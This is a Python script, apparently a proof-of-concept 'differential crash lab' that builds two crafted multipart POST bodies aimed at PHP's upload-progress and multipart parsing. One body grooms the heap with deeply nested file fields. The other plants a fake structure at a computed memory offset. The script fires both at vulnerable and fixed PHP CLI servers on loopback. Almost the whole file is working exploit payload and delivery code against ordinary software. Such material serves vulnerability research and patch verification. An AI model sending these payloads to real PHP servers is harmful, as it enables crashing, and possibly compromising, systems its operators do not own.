#!/usr/bin/env python3
"""Deterministic, loopback-only PHP CLI server differential crash lab."""

from __future__ import annotations

import argparse
import hashlib
import http.client
import socket
import struct
import subprocess
import tempfile
import time
from pathlib import Path


BOUNDARY = b"C" * 10
EXPECTED = {
    "a1": (1_027_886, "1690f6121ffad2ee2aed7d88d2df963f9b8940f3b8e584e57d3e16971e39efd0"),
    "b1": (520_552, "2466c650a7139a28f564e5fdcc75050fec1ef855bd6e31df7a5d653e773db6fb"),
}


def field(name: bytes, value: bytes, filename: bytes | None = None,
          content_type: bytes | None = None) -> bytes:
    part = bytearray(b"--" + BOUNDARY + b"\r\nContent-Disposition: form-data; name=\"" + name + b"\"")
    if filename is not None:
        part += b"; filename=\"" + filename + b"\""
    part += b"\r\n"
    if content_type is not None:
        part += b"Content-Type: " + content_type + b"\r\n"
    part += b"\r\n" + value + b"\r\n"
    return bytes(part)


def make_a1() -> bytes:
    body = bytearray()
    body += field(b"PHPSESSID", bytes.fromhex("636f64657870726f6265313233343536"))
    body += field(b"PHP_SESSION_UPLOAD_PROGRESS", b"k" * 4000)
    for i in range(880):
        name = (f"files[R{i:05d}{'K' * 90}]" + "[a]" * 62).encode()
        ctype = b"C" * (103 if i == 0 else 231) if i < 2 else b"application/octet-stream"
        body += b"--" + BOUNDARY + b"\r\nContent-Disposition: form-data; name=\"" + name
        body += b"\"; filename=\"" + (b"A" if i < 2 else b"") + b"\"\r\n"
        body += b"Content-Type: " + ctype + b"\r\n\r\n"
    for i in range(14):
        body += field(f"f{i:04d}".encode().ljust(103, b"x"), b"v" * 8)
    for i in range(73):
        body += field(f"b{i:04d}".encode(), b"B" * 8000)
    for i in range(20):
        body += field(f"u{i:02d}".encode(), b"U" * 4000)
    body += b"--" + BOUNDARY + b"--\r\n"
    return bytes(body)


def make_b1() -> bytes:
    body = bytearray()
    body += field(b"PHPSESSID", b"a")
    body += field(b"PHP_SESSION_UPLOAD_PROGRESS", b"k0")
    offset = 0x80 * 4096 - 0x1018
    value = bytearray(b"A" * (offset + 24 + 8))
    struct.pack_into("<IIQQ", value, offset, 0, 0x16, 0, 0x2000)
    value[offset + 24:offset + 32] = b"/00BBBBB"
    body += field(b"f0000".ljust(120, b"f"), bytes(value))
    body += b"--" + BOUNDARY + b"--\r\n"
    return bytes(body)


def check_body(label: str, body: bytes) -> None:
    expected_size, expected_sha = EXPECTED[label]
    actual_sha = hashlib.sha256(body).hexdigest()
    if len(body) != expected_size or actual_sha != expected_sha:
        raise RuntimeError(f"{label}: unexpected body size/hash: {len(body)} {actual_sha}")
    print(f"{label}: {len(body)} bytes, sha256={actual_sha}")


def free_port() -> int:
    with socket.socket() as sock:
        sock.bind(("127.0.0.1", 0))
        return sock.getsockname()[1]


def request(port: int, body: bytes) -> str:
    conn = http.client.HTTPConnection("127.0.0.1", port, timeout=15)
    try:
        conn.request("POST", "/index.php", body=body,
                     headers={"Content-Type": f"multipart/form-data; boundary={BOUNDARY.decode()}",
                              "Content-Length": str(len(body))})
        response = conn.getresponse()
        response.read()
        return f"HTTP {response.status}"
    except (OSError, http.client.HTTPException) as exc:
        return f"connection closed ({type(exc).__name__})"
    finally:
        conn.close()


def run_one(label: str, binary: Path, bodies: dict[str, bytes], order: tuple[str, ...]) -> None:
    port = free_port()
    docroot = Path(__file__).resolve().parent / "www"
    with tempfile.TemporaryFile() as log:
        process = subprocess.Popen(
            [str(binary), "-n", "-d", "memory_limit=128M", "-d", "post_max_size=8M",
             "-d", "session.upload_progress.enabled=1", "-d", "display_errors=Off",
             "-S", f"127.0.0.1:{port}", "-t", str(docroot)],
            stdout=log, stderr=subprocess.STDOUT,
        )
        try:
            for _ in range(50):
                if process.poll() is not None:
                    raise RuntimeError(f"{label}: server exited at startup ({process.returncode})")
                try:
                    with socket.create_connection(("127.0.0.1", port), timeout=0.2):
                        break
                except OSError:
                    time.sleep(0.1)
            else:
                raise RuntimeError(f"{label}: server did not start")
            print(f"{label} ({'+'.join(order)}):")
            for stage in order:
                print(f"  {stage}: {request(port, bodies[stage])}")
                time.sleep(0.2)
                print(f"  worker exit: {process.poll()}")
                if process.poll() is not None:
                    break
        finally:
            if process.poll() is None:
                process.terminate()
            try:
                process.wait(timeout=3)
            except subprocess.TimeoutExpired:
                process.kill()
                process.wait()
            log.seek(0)
            tail = log.read().decode(errors="replace").splitlines()[-5:]
            for line in tail:
                print(f"  log: {line}")


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--php-vulnerable", type=Path)
    parser.add_argument("--php-fixed", type=Path)
    parser.add_argument("--write-bodies", type=Path, help="optional output directory for A1/B1")
    args = parser.parse_args()
    bodies = {"a1": make_a1(), "b1": make_b1()}
    for label, body in bodies.items():
        check_body(label, body)
    if args.write_bodies:
        args.write_bodies.mkdir(parents=True, exist_ok=True)
        for label, body in bodies.items():
            (args.write_bodies / f"{label}.bin").write_bytes(body)
    if args.php_vulnerable:
        binary = args.php_vulnerable.resolve(strict=True)
        run_one("vulnerable control", binary, bodies, ("b1",))
        run_one("vulnerable pair", binary, bodies, ("a1", "b1"))
    if args.php_fixed:
        run_one("fixed pair", args.php_fixed.resolve(strict=True), bodies, ("a1", "b1"))


if __name__ == "__main__":
    main()
